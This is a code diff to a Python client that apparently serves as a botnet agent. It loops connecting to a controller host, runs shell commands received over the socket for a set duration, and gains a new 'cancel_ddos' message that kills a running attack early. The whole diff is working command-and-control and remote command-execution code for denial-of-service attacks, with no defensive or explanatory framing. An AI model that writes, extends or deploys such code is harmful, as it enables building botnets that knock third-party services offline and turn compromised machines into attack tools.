@@ -8,6 +8,7 @@ target_host = ""
 target_port = 1046
 
 while True:
+    cancelled = False  # Reset the cancel flag for each iteration
     try:
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client.connect((target_host, target_port))
@@ -25,9 +26,25 @@ while True:
 
                 # run command for specified duration
                 cmd = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid) 
-                time.sleep(duration)
-                os.killpg(os.getpgid(cmd.pid), signal.SIGTERM)
-                break
+                
+                try:
+                    client.settimeout(duration)  # Set a timeout of 5 seconds
+                    data = client.recv(1024)
+                    data_recv = data.decode("utf-8")
+                    print("Received (second):", data_recv)
+
+                    if(data_recv == 'cancel_ddos'):
+                        os.killpg(os.getpgid(cmd.pid), signal.SIGTERM)
+                        cancelled = True
+                        break
+                except socket.timeout:
+                    print("Timeout occurred for the second recv.")
+                finally:
+                    client.settimeout(None)  # Remove the timeout
+
+                if not cancelled:
+                    os.killpg(os.getpgid(cmd.pid), signal.SIGTERM)
+                    break
         client.close()
 
     except Exception as e:
